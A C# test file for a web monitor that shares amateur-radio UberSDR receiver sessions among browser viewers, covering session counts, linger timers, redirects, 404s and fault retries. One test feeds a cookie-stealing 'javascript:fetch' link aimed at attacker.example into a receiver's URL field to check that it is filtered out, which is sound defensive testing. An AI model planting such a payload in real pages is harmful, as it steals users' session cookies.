using System.Net;
using System.Net.WebSockets;
using System.Text;
using System.Text.Json;
using AwesomeAssertions;
using M0LTE.Radio.Audio;
using Microsoft.Extensions.Time.Testing;
using Packet.SoundModem.Daemon;
using Packet.SoundModem.UberSdr;
using Packet.SoundModem.Waterfall;

namespace Packet.SoundModem.Tests.Monitor;

/// <summary>
/// The monitor host: one port, many receivers, a station built when its receiver is first asked
/// for, and one session on each receiver however many browsers are watching it.
/// </summary>
/// <remarks>
/// <para>Driven against real HTTP and real WebSockets on a real port, because the whole mechanism
/// is browsers arriving and leaving: the viewer count that opens and closes a receiver's session
/// is the waterfall server's own, and a test that called <c>SetViewers</c> by hand would be
/// testing the arithmetic and not the promise.</para>
/// <para>The receivers themselves are fakes and the clock is a fake, so a linger is sixty seconds
/// of nothing rather than sixty seconds of waiting, and no real receiver is touched.</para>
/// </remarks>
public class MonitorHostTests
{
    private const string DalgetyHost = "m9psy-1.instance.ubersdr.org";
    private const string ReadingHost = "reading-ubersdr.m0lte.uk";
    private const string DalgetySlug = "m9psy-1";
    private const string ReadingSlug = "reading-ubersdr-m0lte-uk";

    [Fact]
    public async Task A_Station_Is_Not_Created_Until_Its_Receiver_Is_Picked()
    {
        await using var h = await Harness.StartAsync();

        // Nobody has asked for anything, so nothing exists and nothing has been asked of any
        // receiver: a receiver nobody has picked costs its operator nothing at all.
        (await h.RowAsync(DalgetySlug)).State.Should().Be("unpicked");
        h.Preflights(DalgetyHost).Should().Be(0);
        h.Sessions(DalgetyHost).Should().Be(0);

        // The page itself is what builds the station, and it is answered from it straight away.
        string page = await h.GetAsync($"/r/{DalgetySlug}/");
        page.Should().Contain("<!doctype html>");

        (await h.RowAsync(DalgetySlug)).State.Should().Be(
            "idle", "the station exists; nothing has been asked of the receiver yet");
        h.Sessions(DalgetyHost).Should().Be(
            0, "a page load is not somebody watching - a crawler must not cost a session");
    }

    [Fact]
    public async Task Two_Viewers_On_One_Receiver_Open_One_Session()
    {
        // The promise this whole design makes to the people whose antennas these are, and the one
        // that has to be a test rather than a hope: ten visitors on one receiver cost that
        // receiver one session.
        await using var h = await Harness.StartAsync();
        await h.GetAsync($"/r/{DalgetySlug}/");

        using ClientWebSocket first = await h.WatchAsync(DalgetySlug);
        await h.UntilAsync(async () => (await h.RowAsync(DalgetySlug)).Viewers == 1);

        using ClientWebSocket second = await h.WatchAsync(DalgetySlug);
        await h.UntilAsync(async () => (await h.RowAsync(DalgetySlug)).Viewers == 2);

        Row row = await h.RowAsync(DalgetySlug);
        row.State.Should().Be("live");
        row.Viewers.Should().Be(2);
        h.Sessions(DalgetyHost).Should().Be(1, "two browsers, one session on the receiver");
        h.Preflights(DalgetyHost).Should().Be(1, "and one pre-flight, not one per browser");
    }

    [Fact]
    public async Task Viewers_On_One_Receiver_Do_Not_Open_A_Session_On_Another()
    {
        await using var h = await Harness.StartAsync();
        await h.GetAsync($"/r/{DalgetySlug}/");

        using ClientWebSocket watching = await h.WatchAsync(DalgetySlug);
        await h.UntilAsync(async () => (await h.RowAsync(DalgetySlug)).State == "live");

        // Nothing was combined, shared or warmed up: the other receiver has not been contacted,
        // and does not even have a station.
        Row other = await h.RowAsync(ReadingSlug);
        other.State.Should().Be("unpicked");
        other.Viewers.Should().Be(0);
        h.Sessions(ReadingHost).Should().Be(0);
        h.Preflights(ReadingHost).Should().Be(0);
    }

    [Fact]
    public async Task The_Last_Viewer_Leaving_Drops_The_Session_After_The_Linger()
    {
        await using var h = await Harness.StartAsync();
        await h.GetAsync($"/r/{DalgetySlug}/");

        ClientWebSocket watching = await h.WatchAsync(DalgetySlug);
        await h.UntilAsync(async () => (await h.RowAsync(DalgetySlug)).State == "live");
        FakeSession session = h.LastSession(DalgetyHost);

        await h.LeaveAsync(watching);
        await h.UntilAsync(async () => (await h.RowAsync(DalgetySlug)).State == "lingering");
        session.Disposed.Should().BeFalse();

        h.Time.Advance(Harness.Linger - TimeSpan.FromSeconds(1));
        (await h.RowAsync(DalgetySlug)).State.Should().Be(
            "lingering", "a page refresh must not cost the receiver a tear-down and rebuild");
        session.Disposed.Should().BeFalse();

        h.Time.Advance(TimeSpan.FromSeconds(1));
        (await h.RowAsync(DalgetySlug)).State.Should().Be("idle");
        session.Disposed.Should().BeTrue("the receiver gets its slot back when nobody is watching");
    }

    [Fact]
    public async Task A_Viewer_Returning_Inside_The_Linger_Keeps_The_Session()
    {
        await using var h = await Harness.StartAsync();
        await h.GetAsync($"/r/{DalgetySlug}/");

        ClientWebSocket first = await h.WatchAsync(DalgetySlug);
        await h.UntilAsync(async () => (await h.RowAsync(DalgetySlug)).State == "live");
        FakeSession session = h.LastSession(DalgetyHost);

        await h.LeaveAsync(first);
        await h.UntilAsync(async () => (await h.RowAsync(DalgetySlug)).State == "lingering");
        h.Time.Advance(TimeSpan.FromSeconds(30));

        using ClientWebSocket second = await h.WatchAsync(DalgetySlug);
        await h.UntilAsync(async () => (await h.RowAsync(DalgetySlug)).State == "live");

        h.Sessions(DalgetyHost).Should().Be(1, "the held session is the one they came back to");
        session.Disposed.Should().BeFalse();

        // And the cancelled linger must not fire later and take the session anyway.
        await AdvanceWatchingAsync(second, h.Time, Harness.Linger * 2);
        (await h.RowAsync(DalgetySlug)).State.Should().Be("live");
        session.Disposed.Should().BeFalse();
    }

    [Fact]
    public async Task The_Instances_Api_Reports_Each_Receivers_State_And_Viewers()
    {
        await using var h = await Harness.StartAsync();
        await h.GetAsync($"/r/{DalgetySlug}/");
        using ClientWebSocket watching = await h.WatchAsync(DalgetySlug);
        await h.UntilAsync(async () => (await h.RowAsync(DalgetySlug)).State == "live");

        using JsonDocument snapshot = JsonDocument.Parse(await h.GetAsync("/api/instances"));
        JsonElement root = snapshot.RootElement;

        root.GetProperty("title").GetString().Should().Be(Harness.Title);
        root.GetProperty("about").GetString().Should().Be(Harness.About);
        root.GetProperty("page").GetString().Should().NotBeNullOrEmpty("a tab left open across an "
            + "upgrade has to be able to tell that it is out of date");
        root.GetProperty("staleSince").ValueKind.Should().Be(JsonValueKind.Null);

        JsonElement[] rows = [.. root.GetProperty("receivers").EnumerateArray()];
        rows.Should().HaveCount(2);

        JsonElement dalgety = rows.Single(r => r.GetProperty("slug").GetString() == DalgetySlug);
        dalgety.GetProperty("state").GetString().Should().Be("live");
        dalgety.GetProperty("viewers").GetInt32().Should().Be(1);
        dalgety.GetProperty("offered").GetBoolean().Should().BeTrue();
        dalgety.GetProperty("callsign").GetString().Should().Be("M9PSY-1");
        dalgety.GetProperty("location").GetString().Should().Be("Dalgety Bay, Scotland, UK");
        dalgety.GetProperty("snrDb").GetInt32().Should().Be(31);
        dalgety.GetProperty("availableClients").GetInt32().Should().Be(19);
        dalgety.GetProperty("maxClients").GetInt32().Should().Be(20);
        dalgety.GetProperty("description").GetString().Should().Be(
            "M9PSY-1 UberSDR", "the receiver's own description, once a session has been opened");
        dalgety.GetProperty("status").GetString().Should().NotBeNullOrEmpty();

        JsonElement reading = rows.Single(r => r.GetProperty("slug").GetString() == ReadingSlug);
        reading.GetProperty("state").GetString().Should().Be("unpicked");
        reading.GetProperty("viewers").GetInt32().Should().Be(0);
    }

    [Fact]
    public async Task A_Slug_This_Monitor_Does_Not_Serve_Is_A_404()
    {
        await using var h = await Harness.StartAsync();

        (await h.StatusAsync("/r/nobody/")).Should().Be(HttpStatusCode.NotFound);
        (await h.StatusAsync("/r/nobody/ws")).Should().Be(HttpStatusCode.NotFound);
        (await h.StatusAsync("/nope")).Should().Be(HttpStatusCode.NotFound);

        // And no station was conjured up by asking.
        (await h.RowAsync(DalgetySlug)).State.Should().Be("unpicked");
    }

    [Fact]
    public async Task A_Receivers_Prefix_Without_Its_Slash_Redirects_Before_Its_Station_Exists()
    {
        // The page works out what its socket is relative to from its own path, so /r/m9psy-1
        // would leave it reaching for /r/ws and connecting to nothing: a page that loads and then
        // sits there dead. The router redirects once a station is registered; this is the first
        // visit, when there is nothing registered to match.
        await using var h = await Harness.StartAsync();

        using var http = new HttpClient(new HttpClientHandler { AllowAutoRedirect = false })
        {
            BaseAddress = h.BaseAddress,
        };
        HttpResponseMessage response = await http.GetAsync($"/r/{DalgetySlug}");

        response.StatusCode.Should().Be(HttpStatusCode.Found);
        response.Headers.Location!.ToString().Should().EndWith($"/r/{DalgetySlug}/");
    }

    [Fact]
    public async Task A_Public_Url_That_Is_Not_A_Link_Never_Reaches_The_Api()
    {
        // The end of the path the directory's own string travels: what a browser is actually
        // handed. Escaping the four HTML characters would not have stopped this one.
        const string Hostile = "javascript:fetch('https://attacker.example/'+document.cookie)";
        await using var h = await Harness.StartAsync(
            Harness.DirectoryJson.Replace(
                "\"public_url\": \"https://m9psy-1.instance.ubersdr.org/\"",
                $"\"public_url\": \"{Hostile}\""));

        string json = await h.GetAsync("/api/instances");

        json.Should().NotContain("javascript:", "nothing may hand a visitor that link");
        JsonElement dalgety = (await h.SnapshotAsync()).GetProperty("receivers").EnumerateArray()
            .Single(r => r.GetProperty("slug").GetString() == DalgetySlug);
        dalgety.GetProperty("publicUrl").GetString().Should().Be(
            "https://m9psy-1.instance.ubersdr.org/",
            "the receiver's own endpoint stands in, so the row still links somewhere true");

        // And the receiver's own page carries the same checked value in its config message.
        await h.GetAsync($"/r/{DalgetySlug}/");
        using ClientWebSocket watching = await h.WatchAsync(DalgetySlug);
        using JsonDocument config = await NextOfTypeAsync(watching, "config");
        config.RootElement.GetProperty("receiverUrl").GetString().Should().NotContain("javascript:");
    }

    [Fact]
    public async Task An_Open_That_Fails_In_A_Way_Nobody_Listed_Still_Faults_And_Still_Retries()
    {
        // The bug this pins: the catch was a list of exception types, a directory host that would
        // not parse as a URI threw UriFormatException, which was not on it, and the station sat
        // marked as attaching for ever - idle on the picker, a viewer waiting, no retry, and not
        // one word anywhere.
        await using var h = await Harness.StartAsync();
        h.FailOpen(new UriFormatException("Invalid URI: The hostname could not be parsed."));
        await h.GetAsync($"/r/{DalgetySlug}/");

        using ClientWebSocket watching = await h.WatchAsync(DalgetySlug);
        await h.UntilAsync(async () => (await h.RowAsync(DalgetySlug)).State == "faulted");

        h.Errors.Should().Contain(e => e.Contains("cannot reach") && e.Contains("hostname"));
        h.Preflights(DalgetyHost).Should().Be(1);

        // And the ladder picks it up again rather than the station being wedged for good.
        await AdvanceWatchingAsync(watching, h.Time, MonitorHost.RebuildAfter);
        await h.UntilAsync(() => Task.FromResult(h.Preflights(DalgetyHost) >= 2));
    }

    [Fact]
    public async Task A_Faulted_Station_Nobody_Came_Back_To_Stops_Saying_It_Is_Broken()
    {
        // A fault describes a session that no longer exists. Left standing it would have the
        // picker telling every visitor that a receiver is "not working just now" when nothing has
        // been asked of it for a minute and it may well be perfectly fine.
        await using var h = await Harness.StartAsync();
        h.FailOpen(new UriFormatException("Invalid URI: The hostname could not be parsed."));
        await h.GetAsync($"/r/{DalgetySlug}/");

        ClientWebSocket watching = await h.WatchAsync(DalgetySlug);
        await h.UntilAsync(async () => (await h.RowAsync(DalgetySlug)).State == "faulted");

        await h.LeaveAsync(watching);
        await h.UntilAsync(async () => (await h.RowAsync(DalgetySlug)).Viewers == 0);

        h.Time.Advance(MonitorHost.RebuildAfter);
        await h.UntilAsync(async () => (await h.RowAsync(DalgetySlug)).State == "idle");
        h.Preflights(DalgetyHost).Should().Be(1, "nobody was watching, so nobody was asking");
    }

    [Fact]
    public async Task Robots_Are_Asked_To_Leave_The_Receivers_And_The_Api_Alone()
    {
        await using var h = await Harness.StartAsync();

        string robots = await h.GetAsync("/robots.txt");

        robots.Should().Be("User-agent: *\nDisallow: /r/\nDisallow: /api/\n");
        robots.Should().MatchRegex("^[\\x20-\\x7e\\n]+$", "everything this daemon serves is ASCII");
    }

    [Fact]
    public async Task The_Front_Page_Is_The_Picker()
    {
        await using var h = await Harness.StartAsync();

        foreach (string path in (string[])["/", "/index.html"])
        {
            string page = await h.GetAsync(path);
            page.Should().Contain("<!doctype html>").And.Contain("api/instances");
        }
    }

    [Fact]
    public async Task A_Receivers_All_Receivers_Link_Resolves_To_The_Picker()
    {
        // The bug this pins: a receiver's page is always served at /r/<slug>/ (the router
        // redirects the slash-less form there before the page ever loads), and its "All
        // receivers" link is cfg.pickerUrl resolved against that path. A value of "../" resolves
        // one level up, to /r/, which the router answers with a 404 - only the picker at the site
        // root should be behind that link.
        await using var h = await Harness.StartAsync();
        await h.GetAsync($"/r/{DalgetySlug}/");

        using ClientWebSocket watching = await h.WatchAsync(DalgetySlug);
        using JsonDocument config = await NextOfTypeAsync(watching, "config");
        string pickerUrl = config.RootElement.GetProperty("pickerUrl").GetString()!;

        var pagePath = new Uri($"http://monitor.example/r/{DalgetySlug}/");
        var resolved = new Uri(pagePath, pickerUrl);
        resolved.AbsolutePath.Should().Be(
            "/", "that is the picker; anywhere else is a link the router has nothing behind");

        (await h.StatusAsync(resolved.AbsolutePath)).Should().Be(
            HttpStatusCode.OK, "the link a receiver's page gives its visitors must actually load");
    }

    /// <summary>
    /// Moves the clock on with a browser watching, answering the server's keep-alive as the page
    /// does.
    /// </summary>
    /// <remarks>
    /// <para>One jump would be simpler and is no longer honest: the server stops counting a page
    /// that has said nothing for <see cref="WaterfallWebServer.KeepAliveSilence"/> and drops its
    /// socket (#411), so a test that jumped a silent socket over that deadline would be measuring
    /// a receiver nobody was watching any more.</para>
    /// <para>An answer every <see cref="WaterfallWebServer.KeepAlivePeriod"/>, which is twelve
    /// per deadline, because a fake clock and a real socket keep different time: the jump happens
    /// in no time at all while the answer is still crossing loopback, so the server reads it some
    /// steps after the clock says it was sent. The millisecond is what makes twelve a margin
    /// rather than a hope - a send to loopback completes without ever yielding the thread, so
    /// without it this loop can run its whole span before the server gets a turn at any of the
    /// answers.</para>
    /// </remarks>
    private static async Task AdvanceWatchingAsync(
        ClientWebSocket socket, FakeTimeProvider clock, TimeSpan span)
    {
        using var giveUp = new CancellationTokenSource(TimeSpan.FromSeconds(20));
        for (TimeSpan gone = TimeSpan.Zero; gone < span; gone += WaterfallWebServer.KeepAlivePeriod)
        {
            await socket.SendAsync(
                Encoding.UTF8.GetBytes("{\"type\":\"pong\"}"),
                WebSocketMessageType.Text, true, giveUp.Token);
            await Task.Delay(1, giveUp.Token);
            TimeSpan step = span - gone;
            clock.Advance(step < WaterfallWebServer.KeepAlivePeriod
                ? step
                : WaterfallWebServer.KeepAlivePeriod);
        }
    }

    /// <summary>The next message of one type off a page's socket.</summary>
    private static async Task<JsonDocument> NextOfTypeAsync(ClientWebSocket socket, string type)
    {
        var buffer = new byte[64 * 1024];
        using var giveUp = new CancellationTokenSource(TimeSpan.FromSeconds(20));
        while (true)
        {
            WebSocketReceiveResult got = await socket.ReceiveAsync(buffer, giveUp.Token);
            if (got.MessageType != WebSocketMessageType.Text)
            {
                continue;
            }

            var document = JsonDocument.Parse(buffer.AsMemory(0, got.Count));
            if (document.RootElement.TryGetProperty("type", out JsonElement kind)
                && kind.GetString() == type)
            {
                return document;
            }

            document.Dispose();
        }
    }

    private sealed record Row(string State, int Viewers);

    [Fact]
    public async Task A_Receivers_Row_Follows_The_Directory_After_Its_Page_Has_Been_Opened()
    {
        await using var h = await Harness.StartAsync();

        // Both start at what the directory says.
        (await h.FiguresAsync(DalgetySlug)).Should().Be((19, "ok", true));
        (await h.FiguresAsync(ReadingSlug)).Should().Be((20, "ok", true));

        // Opening one receiver's page builds its station, which holds a copy of what the
        // directory said at that moment and never refreshes it - deliberately, because its page
        // has to go on saying whose receiver it is after the directory stops listing it.
        await h.GetAsync($"/r/{DalgetySlug}/");
        (await h.RowAsync(DalgetySlug)).State.Should().Be("idle");

        h.Directory(DirectoryFull);
        await h.RefreshAsync();

        // The row is the directory's, not the station's. A picker that went on saying "19 of 20"
        // about a receiver that filled up an hour ago is worse than one that says nothing, and
        // on a live site this is every receiver anybody has ever clicked.
        (await h.FiguresAsync(ReadingSlug)).Should().Be(
            (1, "busy", true), "the receiver nobody opened follows the directory, so it refreshed");
        (await h.FiguresAsync(DalgetySlug)).Should().Be(
            (0, "critical", false),
            "and so does the one somebody opened - its station is still there and still watched, "
            + "but what the directory says about the receiver is the directory's to say");

        // And what only the station knows is still the station's.
        (await h.RowAsync(DalgetySlug)).State.Should().Be("idle");
    }

    /// <summary>The same two receivers, both now full and one of them offline.</summary>
    private const string DirectoryFull = """
        {"count": 2, "instances": [
          {"host": "m9psy-1.instance.ubersdr.org", "port": 443, "tls": true,
           "callsign": "M9PSY-1", "name": "RX888 with 40m Full Wave Loop (GPSDO)",
           "location": "Dalgety Bay, Scotland, UK",
           "public_url": "https://m9psy-1.instance.ubersdr.org/",
           "is_online": true, "available_clients": 0, "max_clients": 20,
           "public_iq_modes": ["iq48"], "antenna_connected": true, "load_status": "critical",
           "snr_0_30_mhz": 31,
           "tuning_range": {"min_frequency": 10000, "max_frequency": 30000000, "reported": true}},
          {"host": "reading-ubersdr.m0lte.uk", "port": 443, "tls": true,
           "callsign": "M0LTE", "name": "SDR with Active Loop",
           "location": "Reading, England, UK",
           "public_url": "https://reading-ubersdr.m0lte.uk/",
           "is_online": true, "available_clients": 1, "max_clients": 20,
           "public_iq_modes": ["iq48"], "antenna_connected": true, "load_status": "busy",
           "snr_0_30_mhz": 21,
           "tuning_range": {"min_frequency": 10000, "max_frequency": 30000000, "reported": true}}
        ]}
        """;

    /// <summary>A monitor host with fake receivers, a fake directory and a fake clock.</summary>
    private sealed class Harness : IAsyncDisposable
    {
        internal const string Title = "UK packet monitor";
        internal const string About = "The 7050-7052 kHz packet window on 40 m. Receive only.";
        internal static readonly TimeSpan Linger = TimeSpan.FromSeconds(60);

        private readonly MonitorHost _host;
        private readonly HttpClient _http;
        private readonly Dictionary<string, Receiver> _receivers = new(StringComparer.Ordinal);
        private readonly List<ClientWebSocket> _sockets = [];

        private Harness(string directoryJson)
        {
            _directoryJson = directoryJson;
            foreach (string host in (string[])[DalgetyHost, ReadingHost])
            {
                _receivers[host] = new Receiver();
            }

            int port = FreePorts.Next();
            _host = new MonitorHost(new MonitorHostOptions
            {
                Directory = new UberSdrDirectoryOptions
                {
                    Url = "https://instances.example.org/api/instances",
                    IqMode = "iq48",
                    WindowLowHz = 7050136,
                    WindowHighHz = 7051776,
                },
                Port = port,
                Bind = "127.0.0.1",
                Modems = [new ModemConfig { SubChannel = 0, Mode = "afsk1200", Frequency = 1700 }],
                DspRate = 12000,
                DialHz = 7049450,
                Title = Title,
                About = About,
                IdBeacons = false,
                // Both watches off: what they do is Station's and is pinned in StationTests, and
                // a fake receiver that delivers nothing would starve the moment the fake clock is
                // wound forward to expire a linger.
                DeadFeed = new DeadFeedConfig { SilenceSeconds = 0, StarvationSeconds = 0 },
                TimeProvider = Time,
                Journal = _ => new StationJournal("", Lines.Add, Errors.Add),
                FetchDirectory = _ => Task.FromResult(_directoryJson),
                OpenInput = (receiver, log, _) =>
                {
                    Receiver fake = _receivers[receiver.Host];
                    Interlocked.Increment(ref fake.Preflights);
                    if (_openFailure is { } failure)
                    {
                        throw failure;
                    }

                    return Task.FromResult(new OnDemandUberSdrInput(
                        receiver.Endpoint,
                        new ConnectionResponse { Allowed = true, MaxSessionTime = 3600 },
                        $"{receiver.Callsign} UberSDR",
                        sampleRate: 12000,
                        Linger,
                        open: (_, _) =>
                        {
                            var session = new FakeSession { SessionLive = true };
                            lock (fake.Opened)
                            {
                                fake.Opened.Add(session);
                            }

                            return Task.FromResult<IUberSdrSession>(session);
                        },
                        log,
                        Time));
                },
            });

            _http = new HttpClient { BaseAddress = new Uri($"http://127.0.0.1:{port}") };
        }

        private string _directoryJson;
        private Exception? _openFailure;

        /// <summary>Serves a different directory from the next fetch on.</summary>
        internal void Directory(string json) => _directoryJson = json;

        /// <summary>Fetches it again now, as the refresh timer would.</summary>
        internal Task RefreshAsync() => _host.RefreshDirectoryAsync();

        internal FakeTimeProvider Time { get; } = new();

        /// <summary>Every later attempt to open a receiver throws this.</summary>
        internal void FailOpen(Exception failure) => _openFailure = failure;

        /// <summary>The whole snapshot, for a test that wants to read a field this harness does
        /// not model.</summary>
        internal async Task<JsonElement> SnapshotAsync() =>
            JsonDocument.Parse(await GetAsync("/api/instances")).RootElement.Clone();

        internal List<string> Lines { get; } = [];

        internal List<string> Errors { get; } = [];

        internal Uri BaseAddress => _http.BaseAddress!;

        internal static async Task<Harness> StartAsync(string? directoryJson = null)
        {
            var harness = new Harness(directoryJson ?? DirectoryJson);
            (await harness._host.StartAsync()).Should().Be(0, "the site has to come up");
            return harness;
        }

        /// <summary>How many times this receiver's pre-flight has been run: once per station,
        /// not once per browser.</summary>
        internal int Preflights(string host) => Volatile.Read(ref _receivers[host].Preflights);

        /// <summary>How many streaming sessions this receiver has been asked for. The number the
        /// whole design exists to keep at one.</summary>
        internal int Sessions(string host)
        {
            lock (_receivers[host].Opened)
            {
                return _receivers[host].Opened.Count;
            }
        }

        internal FakeSession LastSession(string host)
        {
            lock (_receivers[host].Opened)
            {
                return _receivers[host].Opened[^1];
            }
        }

        internal async Task<string> GetAsync(string path) => await _http.GetStringAsync(path);

        internal async Task<HttpStatusCode> StatusAsync(string path) =>
            (await _http.GetAsync(path)).StatusCode;

        /// <summary>The three figures on a row that are the directory's and not this process's.</summary>
        internal async Task<(int Available, string? Load, bool Offered)> FiguresAsync(string slug)
        {
            using JsonDocument snapshot = JsonDocument.Parse(await GetAsync("/api/instances"));
            JsonElement row = snapshot.RootElement.GetProperty("receivers").EnumerateArray()
                .Single(r => r.GetProperty("slug").GetString() == slug);
            return (
                row.GetProperty("availableClients").GetInt32(),
                row.GetProperty("loadStatus").GetString(),
                row.GetProperty("offered").GetBoolean());
        }

        internal async Task<Row> RowAsync(string slug)
        {
            using JsonDocument snapshot = JsonDocument.Parse(await GetAsync("/api/instances"));
            JsonElement row = snapshot.RootElement.GetProperty("receivers").EnumerateArray()
                .Single(r => r.GetProperty("slug").GetString() == slug);
            return new Row(
                row.GetProperty("state").GetString()!, row.GetProperty("viewers").GetInt32());
        }

        /// <summary>A browser watching one receiver: the page's own socket, on its own prefix.</summary>
        internal async Task<ClientWebSocket> WatchAsync(string slug)
        {
            var socket = new ClientWebSocket();
            await socket.ConnectAsync(
                new Uri($"ws://127.0.0.1:{_host.Port}/r/{slug}/ws"), CancellationToken.None);
            lock (_sockets)
            {
                _sockets.Add(socket);
            }

            return socket;
        }

        internal async Task LeaveAsync(ClientWebSocket socket)
        {
            await socket.CloseAsync(WebSocketCloseStatus.NormalClosure, "", CancellationToken.None);
            socket.Dispose();
            lock (_sockets)
            {
                _sockets.Remove(socket);
            }
        }

        /// <summary>Waits on the condition rather than sleeping through a guess at how long a
        /// handshake takes on a loaded runner.</summary>
        internal async Task UntilAsync(Func<Task<bool>> condition)
        {
            using var giveUp = new CancellationTokenSource(TimeSpan.FromSeconds(20));
            while (!await condition())
            {
                giveUp.Token.ThrowIfCancellationRequested();
                await Task.Delay(20, giveUp.Token);
            }
        }

        public async ValueTask DisposeAsync()
        {
            lock (_sockets)
            {
                foreach (ClientWebSocket socket in _sockets)
                {
                    socket.Dispose();
                }

                _sockets.Clear();
            }

            await _host.DisposeAsync();
            _http.Dispose();
        }

        private sealed class Receiver
        {
            internal int Preflights;

            internal List<FakeSession> Opened { get; } = [];
        }

        /// <summary>Two receivers, in the directory's own field names and shapes.</summary>
        internal const string DirectoryJson = """
            {"count": 2, "instances": [
              {"host": "m9psy-1.instance.ubersdr.org", "port": 443, "tls": true,
               "callsign": "M9PSY-1", "name": "RX888 with 40m Full Wave Loop (GPSDO)",
               "location": "Dalgety Bay, Scotland, UK",
               "public_url": "https://m9psy-1.instance.ubersdr.org/",
               "is_online": true, "available_clients": 19, "max_clients": 20,
               "public_iq_modes": ["iq48"], "antenna_connected": true, "load_status": "ok",
               "snr_0_30_mhz": 31,
               "tuning_range": {"min_frequency": 10000, "max_frequency": 30000000, "reported": true}},
              {"host": "reading-ubersdr.m0lte.uk", "port": 443, "tls": true,
               "callsign": "M0LTE", "name": "SDR with Active Loop",
               "location": "Reading, England, UK",
               "public_url": "https://reading-ubersdr.m0lte.uk/",
               "is_online": true, "available_clients": 20, "max_clients": 20,
               "public_iq_modes": ["iq48"], "antenna_connected": true, "load_status": "ok",
               "snr_0_30_mhz": 21,
               "tuning_range": {"min_frequency": 10000, "max_frequency": 30000000, "reported": true}}
            ]}
            """;

    }

    /// <summary>
    /// A receiver's streaming session, without a socket: it says it is live and delivers nothing,
    /// paced as the real one is (which waits inside Read rather than returning 0 in a spin).
    /// </summary>
    private sealed class FakeSession : IUberSdrSession
    {
        public ConnectionResponse Connection { get; } = new() { Allowed = true, MaxSessionTime = 3600 };

        public bool SessionLive { get; init; }

        public long Discontinuities => 0;

        public int SampleRate => 12000;

        public bool Disposed { get; private set; }

        /// <summary>Never raised here: what an abandoned session costs is the on-demand input's
        /// own business and is pinned in <c>OnDemandUberSdrInputTests</c>.</summary>
        public event Action<string>? Lost
        {
            add { }
            remove { }
        }

        public int Read(Span<float> destination)
        {
            // Paced as every real input is: each one waits inside Read rather than returning 0
            // in a spin, which is what lets the receive loop have no backoff of its own.
            Thread.Sleep(5);
            return 0;
        }

        public void Dispose() => Disposed = true;
    }
}
